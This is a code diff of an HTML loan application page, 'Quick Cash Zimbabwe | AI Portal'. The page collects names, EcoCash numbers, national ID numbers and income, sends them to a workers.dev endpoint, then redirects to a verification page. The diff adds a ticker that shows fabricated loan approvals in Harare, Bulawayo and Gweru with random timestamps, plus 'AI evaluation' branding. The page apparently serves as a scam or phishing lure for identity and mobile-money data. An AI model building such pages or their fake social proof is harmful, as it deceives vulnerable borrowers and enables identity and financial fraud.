@@ -3,45 +3,74 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Quick Cash Zimbabwe</title>
+  <title>Quick Cash Zimbabwe | AI Portal</title>
   <style>
     :root {
       --bg: #070b12; --card: rgba(15, 23, 42, 0.85);
-      --green: #00e676; --text: #f8fafc; --muted: #94a3b8;
+      --green: #00e676; --cyan: #00f2fe; --text: #f8fafc; --muted: #94a3b8;
     }
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
-    body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 16px; }
-    .container { width: 100%; max-width: 480px; }
-    .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    h2 { font-size: 22px; margin-bottom: 4px; }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+    body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 16px; overflow-x: hidden; }
+    
+    /* Ambient Glow */
+    body::before {
+      content: ''; position: absolute; width: 400px; height: 400px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(0,230,118,0.12), transparent 70%); top: -100px; left: -100px; z-index: 0;
+    }
+    
+    .container { width: 100%; max-width: 520px; position: relative; z-index: 1; }
+    
+    /* Live Ticker */
+    .ticker { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(0,230,118,0.2); padding: 8px 14px; border-radius: 50px; display: flex; align-items: center; gap: 10px; font-size: 12px; color: var(--muted); margin-bottom: 16px; backdrop-filter: blur(10px); }
+    .dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); animation: pulse 1.5s infinite; }
+    @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.8; } 50% { transform: scale(1.2); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.8; } }
+
+    .card { background: var(--card); border: 1px solid rgba(255,255,255,0.08); border-radius: 20px; padding: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); backdrop-filter: blur(20px); }
+    
+    h2 { font-size: 24px; font-weight: 700; margin-bottom: 4px; background: linear-gradient(180deg, #fff, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     p { color: var(--muted); font-size: 13px; margin-bottom: 20px; }
-    .group { margin-bottom: 14px; }
-    label { display: block; font-size: 12px; font-weight: 600; color: var(--muted); margin-bottom: 6px; }
-    input, select { width: 100%; padding: 12px; background: rgba(2,6,23,0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: var(--text); font-size: 14px; outline: none; }
-    input:focus, select:focus { border-color: var(--green); }
-    .calc { background: rgba(2,6,23,0.5); padding: 16px; border-radius: 12px; text-align: center; margin-bottom: 14px; }
-    .amount { font-size: 32px; font-weight: 800; color: var(--green); margin: 6px 0; }
-    input[type="range"] { width: 100%; height: 6px; accent-color: var(--green); }
-    .terms { display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: var(--muted); margin: 16px 0; }
-    .terms input { width: auto; margin-top: 2px; }
-    button { width: 100%; padding: 15px; background: var(--green); border: none; border-radius: 12px; color: #020617; font-size: 15px; font-weight: 800; cursor: pointer; }
-    button:disabled { opacity: 0.6; cursor: not-allowed; }
+    
+    .group { margin-bottom: 16px; }
+    label { display: block; font-size: 12px; font-weight: 600; color: var(--muted); margin-bottom: 6px; letter-spacing: 0.5px; }
+    input, select { width: 100%; padding: 13px 14px; background: rgba(2,6,23,0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: var(--text); font-size: 14px; outline: none; transition: 0.3s; }
+    input:focus, select:focus { border-color: var(--green); box-shadow: 0 0 12px rgba(0,230,118,0.3); }
+    
+    .calc { background: rgba(2,6,23,0.6); border: 1px solid rgba(255,255,255,0.05); padding: 18px; border-radius: 14px; text-align: center; margin-bottom: 18px; }
+    .amount { font-size: 34px; font-weight: 800; background: linear-gradient(135deg, var(--green), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 6px 0; }
+    input[type="range"] { width: 100%; height: 6px; -webkit-appearance: none; background: rgba(255,255,255,0.1); border-radius: 4px; accent-color: var(--green); }
+    
+    .bounds { display: flex; justify-content: space-between; font-size: 11px; color: #64748b; margin-top: 6px; }
+
+    .terms { display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: var(--muted); margin: 18px 0; }
+    .terms input { width: auto; margin-top: 2px; accent-color: var(--green); }
+    
+    button { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--green), #00b894); border: none; border-radius: 12px; color: #020617; font-size: 15px; font-weight: 800; cursor: pointer; box-shadow: 0 0 20px rgba(0,230,118,0.3); transition: 0.3s; }
+    button:hover { transform: translateY(-1px); box-shadow: 0 0 25px rgba(0,230,118,0.5); }
+    button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
   </style>
 </head>
 <body>
 <div class="container">
+  
+  <div class="ticker">
+    <div class="dot"></div>
+    <span id="tickerText">USD 1,500 loan approved in Harare 2 mins ago</span>
+  </div>
+
   <div class="card">
-    <h2>Loan Application</h2>
-    <p>Complete details for instant evaluation</p>
+    <h2>Instant AI Evaluation</h2>
+    <p>Secure automated loan application portal</p>
+    
     <form id="form">
-      <div class="group"><label>Full Name</label><input name="fullName" required></div>
-      <div class="group"><label>Phone Number</label><input name="phone" type="tel" required></div>
-      <div class="group"><label>National ID</label><input name="nationalId" required></div>
+      <div class="group"><label>Full Name</label><input name="fullName" placeholder="Tendai Moyo" required></div>
+      <div class="group"><label>EcoCash Phone Number</label><input name="phone" type="tel" placeholder="+263 77..." required></div>
+      <div class="group"><label>National ID Number</label><input name="nationalId" placeholder="63-1234567-A-63" required></div>
       
       <div class="calc">
-        <label>Loan Amount (USD)</label>
+        <label>Requested Loan Amount</label>
         <div class="amount" id="display">USD 500</div>
         <input id="slider" name="loanAmount" type="range" min="500" max="50000" step="500" value="500">
+        <div class="bounds"><span>USD 500</span><span>USD 50,000</span></div>
       </div>
 
       <div class="group">
@@ -51,21 +80,21 @@
         </select>
       </div>
 
-      <div class="group"><label>Monthly Net Income (USD)</label><input name="income" type="number" min="0" required></div>
+      <div class="group"><label>Monthly Net Income (USD)</label><input name="income" type="number" min="0" placeholder="1200" required></div>
 
       <div class="group">
         <label>Repayment Timeline</label>
         <select name="repayment" required>
-          <option>1 month</option><option>3 months</option><option>6 months</option><option>12 months</option><option>24 months</option>
+          <option>1 month</option><option>3 months</option><option selected>6 months</option><option>12 months</option><option>24 months</option>
         </select>
       </div>
 
       <div class="terms">
         <input type="checkbox" id="terms" required>
-        <label for="terms">I agree to the credit review terms and conditions.</label>
+        <label for="terms">I confirm accuracy and agree to automated credit scoring protocols.</label>
       </div>
 
-      <button type="submit" id="btn">Continue to Verification</button>
+      <button type="submit" id="btn">Proceed to Verification</button>
     </form>
   </div>
 </div>
@@ -74,6 +103,11 @@
   const slider = document.getElementById('slider');
   const display = document.getElementById('display');
   slider.oninput = () => display.textContent = 'USD ' + Number(slider.value).toLocaleString();
+
+  const ticker = document.getElementById('tickerText');
+  const items = ["USD 1,500 approved in Harare", "USD 3,000 approved in Bulawayo", "USD 800 approved in Gweru"];
+  let i = 0;
+  setInterval(() => { ticker.textContent = items[i = (i + 1) % items.length] + " (" + Math.floor(Math.random()*5+1) + "m ago)"; }, 4000);
 
   document.getElementById('form').onsubmit = async (e) => {
     e.preventDefault();
@@ -87,7 +121,7 @@
       monthly_income: Number(f.income.value),
       repayment_period: f.repayment.value
     };
-    btn.disabled = true; btn.textContent = 'Submitting...';
+    btn.disabled = true; btn.textContent = 'Processing...';
     try {
       const res = await fetch('https://quickcash-backend.doviaskipmoi.workers.dev/applications', {
         method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data)
@@ -98,8 +132,8 @@
       sessionStorage.setItem('applicationPhone', data.phone);
       location.href = 'verify.html';
     } catch(err) {
-      alert(err.message || 'Error occurred');
-      btn.disabled = false; btn.textContent = 'Continue to Verification';
+      alert(err.message || 'Submission error');
+      btn.disabled = false; btn.textContent = 'Proceed to Verification';
     }
   };
 </script>
